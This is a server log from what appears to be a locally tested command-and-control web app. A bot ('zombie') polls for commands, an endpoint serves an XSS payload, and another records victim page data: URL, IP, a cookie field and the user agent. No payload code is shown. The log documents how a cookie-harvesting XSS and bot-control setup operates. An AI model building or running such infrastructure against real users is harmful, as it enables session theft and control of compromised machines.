2025-06-24 23:31:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:32:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:32:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:32:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:32:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:32:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:33:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:33:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:33:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:33:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:33:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:34:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:34:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:34:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:34:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:34:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:35:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:35:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:35:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:35:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:35:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:36:16 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:36:16 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:36:16 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:36:16 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:36:16 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:36:16 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:36:16 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:36:16 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:36:16 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 23:36:20 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 23:36:20 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 23:36:20 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:36:20 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:36:20 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:36:20 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:36:20 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:36:20 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:36:20 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:36:20 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:36:20 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:36:20 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:36:20 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:36:20 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:36:20 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:36:20 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 23:36:20 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 23:37:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0221s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:37:45 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:37:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:37:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:45] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:37:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:37:45 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:37:45 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:37:45.696Z"},時間: 2025-06-24 23:37:45.706503
2025-06-24 23:37:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0073s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:37:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:45] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:37:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0029s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:37:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:37:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:37:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:37:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:37:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
